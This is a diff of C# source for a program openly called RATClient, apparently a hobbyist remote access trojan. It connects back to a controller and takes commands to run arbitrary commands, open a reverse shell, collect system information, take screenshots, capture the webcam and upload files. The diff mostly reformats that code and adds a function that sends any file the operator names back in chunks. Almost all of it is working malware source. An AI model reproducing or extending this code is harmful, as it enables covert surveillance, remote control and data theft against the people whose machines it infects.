@@ -1,8 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Net.Sockets;
 using System.Net;
 using System.Threading;
@@ -11,8 +9,6 @@ using System.Diagnostics;
 using System.Drawing.Imaging;
 using ScreenShotDemo;
 using System.Drawing;
-
-using DirectShowLib;
 using SnapShot;
 using System.Runtime.InteropServices;
 
@@ -62,7 +58,6 @@ namespace RATClient
             openSock = phoneHome;
             idleLoop();
         }
-
         static void idleLoop()
         {
             Console.WriteLine("Entering idle loop...");
@@ -95,33 +90,46 @@ namespace RATClient
         static void receptionProcessing(string recvString)
         {
             Console.WriteLine("Entered reception processing for string: {0}", recvString);
-            
-            if(recvString.StartsWith("3><3[")) //If the packet leads with 3><3[ (ooh aren't you so h4x0r), process it with exec
+
+            if (recvString.StartsWith("3><3[")) //If the packet leads with 3><3[ (ooh aren't you so h4x0r), process it with exec
             {
                 String issuedCommand = recvString.Substring(6);
                 issuedCommand = issuedCommand.Substring(0, issuedCommand.Length - 1);
                 exec(issuedCommand);
-            }else if (recvString.StartsWith("ki||")) //If it's this, process for shutdown
+            }
+            else if (recvString.StartsWith("ki||")) //If it's this, process for shutdown
             {
                 shutdownProcedure();
-            }else if (recvString.StartsWith("rev3rs3")) //if it's that, start a reverse shell
+            }
+            else if (recvString.StartsWith("rev3rs3")) //if it's that, start a reverse shell
             {
                 reverseShell();
-            }else if (recvString.StartsWith("inf0")) //if it's this, get system info
+            }
+            else if (recvString.StartsWith("inf0")) //if it's this, get system info
             {
                 getSystemInfo();
-            }else if (recvString.StartsWith("y0ink"))
+            }
+            else if (recvString.StartsWith("y0ink"))
             {
                 sendScreenshot();
-            }else if (recvString.StartsWith("c4m"))
+            }
+            else if (recvString.StartsWith("c4m"))
             {
                 captureWebcam();
-            }else if (recvString.StartsWith("upl04d"))
+            }
+            else if (recvString.StartsWith("upl04d"))
             {
                 recieveFile();
             }
+            else if (recvString.StartsWith("exf1l"))
+            {
+                exfilFile();
+            }
+            else
+            {
+                idleLoop();
+            }
         }
-
         static void recieveFile()
         {
             openSock.Send(genericRecieve);
@@ -189,10 +197,6 @@ namespace RATClient
             StreamReader stdout = shell.StandardOutput;
             StreamReader stderr = shell.StandardError;
             StreamWriter stdin = shell.StandardInput;
-            /*String confirmMessage = "reverseShellStart";
-            confirmMessage += (char)4;
-            byte[] confirmBytes = Encoding.ASCII.GetBytes(confirmMessage);
-            openSock.Send(confirmBytes);*/
             while (true)
             {
                 char readchr;
@@ -268,10 +272,6 @@ namespace RATClient
             Thread execDataThread = new Thread(new ParameterizedThreadStart(packAndSend));
             execDataThread.Start(stdOut);
         }
-        static void recvFile()
-        {
-
-        }
         static void sendScreenshot()//very very slight memory leak here...
         {
             Console.WriteLine("Running screenshot sender...");
@@ -299,7 +299,7 @@ namespace RATClient
             }
             catch
             {
-
+                Console.WriteLine("Regedit failed pending elevation");
             }
 
             int VIDEODEVICE = 0; // zero based index of video capture device to use
@@ -344,6 +344,113 @@ namespace RATClient
             Marshal.FreeCoTaskMem(m_ip); //free the int pointer
 
         }
+        static void exfilFile()
+        {
+            Console.WriteLine("Exfiltration start");
+            byte[] confBytes = new byte[1]; //Create an array to store confirmation bytes
+            openSock.Send(genericRecieve); //send a generic recieve packet to kick off the CC process
+            Console.WriteLine("Generic recieve sent");
+            Console.WriteLine("Awaiting path bytes...");
+            byte[] filePathBytes = new byte[1024]; //Set up a byte array for file path (max 1024 characters, maybe overkill)
+            int filePathLen = openSock.Receive(filePathBytes);//recieve the full file path
+            String filePath = Encoding.ASCII.GetString(filePathBytes, 0, filePathLen); //Translate it to a string
+            Console.WriteLine("Path bytes recieved: {0}", filePath);
+            String fileName = filePath.Split('\\')[filePath.Split('\\').Length-1]; //Split it at backslashes to get the file name
+            byte[] fileNameBytes = Encoding.ASCII.GetBytes(fileName); //Encode that to a byte array
+            openSock.Send(fileNameBytes); //Pass that over the wire
+            Console.WriteLine("Sent file name: {0}", fileName);
+            openSock.Receive(confBytes); //Wait for confirmation bytes
+            Console.WriteLine("Confirmation recieved for file name.");
+
+
+            Console.WriteLine("Started population of file bytes");
+            //Borrowed code from file infiltration
+            List<byte> fileBytes = new List<byte>();
+            try
+            {
+                FileStream f = File.Open(filePath, FileMode.Open);
+                while (f.Length != f.Position)
+                {
+                    fileBytes.Add((byte)f.ReadByte());
+                }
+                f.Close();
+                byte[] terminator = Encoding.ASCII.GetBytes("♦♦endOfFile♦♦");
+                foreach (byte b in terminator)
+                {
+                    fileBytes.Add(b);
+                }
+                Console.WriteLine("File bytes ready to send");
+                byte[] lengthString = Encoding.ASCII.GetBytes(fileBytes.ToArray().LongLength.ToString()); //set the bytes tp length long value as a string
+                openSock.Send(lengthString); //Send that
+                Console.WriteLine("Sent file length of {0} bytes", fileBytes.ToArray().LongLength.ToString());
+                openSock.Receive(confBytes);//wait for a confirmation
+                Console.WriteLine("Recived confirmation bytes for file length");
+
+
+                Console.WriteLine("Starting sending of 1kb file chunks...");
+                //send CC file bytes
+                byte[] fileChunk = new byte[1024]; //prepare a 1kb buffer to store blocks of the file
+                byte[] fileByteArray = fileBytes.ToArray(); //ALL the file bytes
+                int iterator = 0; //An iterator for the while loop
+                bool breakFlag = false; //A flag to break out of the for loop
+                Console.Write("Looping over file bytes");
+                while (true)
+                {
+                    Console.Write(".");
+
+                    for (int i = 0; i < 1024; i++)//Fill up a file chunk
+                    {
+                        try
+                        {
+                            fileChunk[i] = fileByteArray[iterator * 1024 + i];//Fill in a file chunk with data
+                        }
+                        catch//if this trips, we read a have a null access exception which means we're at the end of fileByteArray
+                        {
+                            Console.WriteLine("\nLast chunk tripped");
+                            breakFlag = true;//set the flag to break out of the outer while loop
+                            byte[] runtFileChunk = new byte[i];//define a shorter bytearray to hold the ending
+                            for (int j = 0; j < i; j++)
+                            {
+                                runtFileChunk[j] = fileChunk[j];//populate it
+                            }
+                            Console.WriteLine("Sending last chunk");
+                            openSock.Send(runtFileChunk);//send it
+                            openSock.Receive(confBytes);
+                            Console.WriteLine("recieved confirmation of last chunk.");
+                            break; //break out of for loop
+                        }
+
+                    }
+                    if (breakFlag)
+                    {
+                        break;
+                    }
+                    openSock.Send(fileChunk); //send the full 1024 byte file chunk
+                    openSock.Receive(confBytes);
+                    iterator++; //Don't forget this you fuckin toolbag
+                }
+                Console.WriteLine("Reception loop broken");
+                openSock.Receive(confBytes);
+                Console.WriteLine("Last confirm recieved. File upload success.");
+
+            }
+            catch
+            {
+                byte[] errBytes = Encoding.ASCII.GetBytes("fileError♦");
+                try
+                {
+                    openSock.Send(errBytes);
+                }catch
+                {
+                    Console.WriteLine("Connection lost with remote host");
+                }
+                
+            }
+            
+
+        }
+
+
         static void Main(string[] args)
         {
                 Thread t = new Thread(phoneHome);
